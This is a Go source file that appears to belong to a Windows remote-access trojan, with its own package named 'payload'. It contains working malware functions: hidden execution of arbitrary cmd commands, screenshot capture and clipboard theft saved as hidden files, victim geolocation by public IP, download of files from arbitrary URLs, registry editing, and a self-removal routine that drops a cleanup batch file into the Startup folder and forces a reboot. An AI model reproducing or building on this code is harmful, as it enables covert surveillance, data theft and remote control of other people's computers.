package lib

import (
	"fmt"
	"image/png"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	conf "payload/config"
	"strconv"
	"strings"
	"syscall"

	"github.com/atotto/clipboard"
	"github.com/kbinani/screenshot"
	"github.com/oschwald/geoip2-golang"
)

func (f *FileInf) SelfRemove() {
	registryKey(conf.HKEY_STARTUP).DeleteValue(strings.TrimSuffix(f.NNAME, ".exe"))

	rmbatch := "@echo off\r\n" +
		"set \"payload_path=" + conf.PAYLOAD_PATH + f.NNAME + "\"\r\n" +
		"set \"batch_path=%~f0\"\r\n" +
		"start /B cmd.exe /C ping -n 1 127.0.0.1 > nul & " +
		"taskkill /IM \"" + f.NNAME + "\" /F & " +
		"del \"%batch_path%\" & del /f /q /a:h \"%payload_path%\"\r\n" +
		"exit"
	f.FileName = conf.REMOVE_SERVICE
	f.FileData = rmbatch
	f.createFile()
	os.Rename(f.CurrentPath()+"\\"+f.FileName, "C:\\Users\\"+CurrentUser()+
		"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+f.FileName)
	f.RShell("shutdown /r /t 0")
}

func (f *FileInf) RShell(command string) string {
	shell := exec.Command("cmd", "/C", command)
	outshell, err := shell.CombinedOutput()
	if err != nil {
		return string(outshell)
	}

	shell.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}
	oversize := strings.Trim(string(command), " ") + "_" + "shell.txt"

	f.FileName = fmt.Sprintf("%d", rand.Intn(1000)) + oversize
	f.FileData = string(outshell)

	return f.OverSizeData()
}

func (f *FileInf) CaptureScreen() string {
	display := screenshot.NumActiveDisplays()
	for i := 0; i < display; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			log.Panic(err)
		}
		screen, _ := f.createFile()
		defer screen.Close()
		png.Encode(screen, img)
	}

	HiddenAttribute(f.CurrentPath() + "\\" + f.FileName)

	return "Image Name: " + f.FileName + "\n" +
		"Image Path: " + f.CurrentPath() + "\\" + f.FileName +
		"\nHidden Attribute: " + strconv.FormatBool(conf.HIDE_FILE)
}

func (f *FileInf) GeoIP() string {
	body, err := io.ReadAll(httpReq("GET", "https://api.ipify.org").Body)
	if err != nil {
		log.Panic(err)
	}
	db, err := geoip2.Open(f.FileName)
	if err != nil {
		return "MMDB file not found...\n" +
			"Here is a link to download it: https://www.maxmind.com"
	}
	defer db.Close()

	ip := net.ParseIP(string(body))
	record, err := db.City(ip)
	if err != nil {
		log.Panic(err)
	}

	Cordinates := fmt.Sprintf("%v, %v", record.Location.Latitude, record.Location.Longitude)

	return "Country: " + record.Country.Names["en"] +
		"\nCity: " + record.City.Names["en"] +
		"\nTime Zone: " + record.Location.TimeZone +
		"\nCordinates: " + Cordinates +
		"\nPublic IPv4: " + string(body)
}

func RegistryMethod(rmethod, rname, rvalue, rpath string) string {
	switch rmethod {
	case "--set":
		if err := registryKey(rpath).SetStringValue(rname, rvalue); err != nil {
			log.Panic(err)
		}
		return "Registry name \"" + rname + "\" is set." +
			"\nRegistry value \"" + rvalue + "\" is set." +
			"\nRegistry is set at \"" + rpath + "\""
	case "--del":
		if err := registryKey(rpath).DeleteValue(rname); err != nil {
			log.Panic(err)
		}
		return "Registry name \"" + rname + "\" is going to be delete at \"" + rpath + "\"." +
			"\nRegistry value \"" + rvalue + "\"  is going to be delete at \"" + rpath + "\"." +
			"\nRegistry key name \"" + rname + "\" is delete at \"" + rpath + "\"."
	default:
		return "Can not find method name \"" + rmethod + "\""
	}
}

func (f *FileInf) GetClipboard() string {
	clipdata, err := clipboard.ReadAll()
	if err != nil {
		log.Panic(err)
	}

	f.FileName = "Clipboard.txt"
	f.FileData = clipdata

	return "Client Clipboard: " + f.OverSizeData()
}

func (f *FileInf) WebLoad(url string) string {
	newFile, err := f.createFile()
	if err != nil {
		log.Panic(err)
	}

	_, err = io.Copy(newFile, httpReq("GET", url).Body)
	if err != nil {
		log.Panic(err)
	}
	newFile.Close()

	HiddenAttribute(f.CurrentPath() + "\\" + f.FileName)

	return "File Name: " + f.FileName + "\n" +
		"File Path: " + f.CurrentPath() + "\\" + f.FileName +
		"\nHidden Attribute: " + strconv.FormatBool(conf.HIDE_FILE)
}
